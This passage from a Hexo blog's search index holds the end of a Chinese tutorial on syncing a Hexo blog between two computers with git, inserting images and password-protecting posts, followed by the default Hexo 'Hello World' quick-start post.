-d</code>发布网站并推送静态文件到master分支。</li></ul></li><li><p>同步分支（PC2上面操作）</p><ul><li>安装hexo：<code>npm install -g hexo-cli</code></li><li>clone远程仓库到本地 <code>git clone git@github.com:username/username.github.io.git</code></li><li>根据<code>packge.json</code>安装依赖<code>npm install &amp;&amp; npm install hexo-deployer-git</code></li><li>此时通过命令git g、git s即可在本地开启同步下来的博客静态页面，并通过 <a href="https://links.jianshu.com/go?to=http%3A%2F%2Flocalhost%3A4000%2F" target="_blank" rel="noopener">http://localhost:4000/</a> 访问</li></ul></li><li><p>发布博文（PC1或者PC2）</p><ul><li><code>git pull</code>从远程hexo分支拉取最新的环境文件到本地，可以理解为svn的更新操作。比如在公司写了博客，回家在电脑上也要写需要先执行这一步操作。</li><li>文章写完，要发布时，需要先提交环境文件，再发布文章。按以下顺序执行命令<code>it add . &amp; git commit -m &quot;some description&quot; &amp; git push origin hexo -f</code>,最后执行<code>hexo g -d</code></li></ul></li></ul><h3 id="补充内容"><a href="#补充内容" class="headerlink" title="补充内容"></a>补充内容</h3><h4 id="文章中插入图片"><a href="#文章中插入图片" class="headerlink" title="文章中插入图片"></a>文章中插入图片</h4><ol><li>设置站点配置<code>_config.yml:</code>将<code>post_asset_folder: false</code>改为<code>post_asset_folder: true</code></li><li>安装插件:<code>npm install https://github.com/CodeFalling/hexo-asset-image -- save</code></li><li>运行<code>hexo n &quot;XXXXXX&quot;</code>,生成XXXXX.md博文时就会在<code>/source/_posts</code>目录下生成XXXXXX的文件夹，将你想在XXXXX博文中插入的照片放置到这个同名文件夹中即可，图片的命名随意。</li><li>添加图片:在想添加的位置写入<code>![](图片名字.图片格式)</code>,例如<code>![](1.png)</code></li></ol><h4 id="文章加密"><a href="#文章加密" class="headerlink" title="文章加密"></a>文章加密</h4><ol><li>安装<code>npm install --save hexo-blog-encrypt</code></li><li>首先在 <strong>站点配置文件</strong> 中启用该插件:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encrypt:</span><br><span class="line">    <span class="built_in">enable</span>: <span class="literal">true</span></span><br></pre></td></tr></table></figure><ol start="3"><li>然后在你的文章的头部添加上对应的字段，如 password, abstract, message</li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">---</span></span><br><span class="line"><span class="selector-tag">title</span>: 文章加密</span><br><span class="line"><span class="selector-tag">date</span>: 2019<span class="selector-tag">-01-04T22</span><span class="selector-pseudo">:20</span><span class="selector-pseudo">:13.000Z</span></span><br><span class="line"><span class="selector-tag">category</span>: 教程</span><br><span class="line"><span class="selector-tag">tags</span>:</span><br><span class="line">  <span class="selector-tag">-</span> 博客</span><br><span class="line">  <span class="selector-tag">-</span> <span class="selector-tag">Hexo</span></span><br><span class="line"><span class="selector-tag">keywords</span>: 博客文章密码</span><br><span class="line"><span class="selector-tag">password</span>: <span class="selector-tag">TloveY</span></span><br><span class="line"><span class="selector-tag">abstract</span>: 密码：<span class="selector-tag">TloveY</span></span><br><span class="line"><span class="selector-tag">message</span>:  输入密码，查看文章</span><br><span class="line"><span class="selector-tag">---</span></span><br></pre></td></tr></table></figure><p>参考资料</p><blockquote><p><a href="https://blog.csdn.net/Fitz1318/article/details/86548129" target="_blank" rel="noopener">https://blog.csdn.net/Fitz1318/article/details/86548129</a></p><p><a href="https://www.jianshu.com/p/44e211829447" target="_blank" rel="noopener">https://www.jianshu.com/p/44e211829447</a></p><p><a href="https://www.jianshu.com/p/fceaf373d797" target="_blank" rel="noopener">https://www.jianshu.com/p/fceaf373d797</a></p><p><a href="https://www.dazhuanlan.com/2019/11/16/5dd00ffcb4f27/" target="_blank" rel="noopener">https://www.dazhuanlan.com/2019/11/16/5dd00ffcb4f27/</a></p><p><a href="https://www.jianshu.com/p/937bda9123da" target="_blank" rel="noopener">https://www.jianshu.com/p/937bda9123da</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
            <tag> 多端同步 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2020/03/17/hello-world/"/>
      <url>/2020/03/17/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
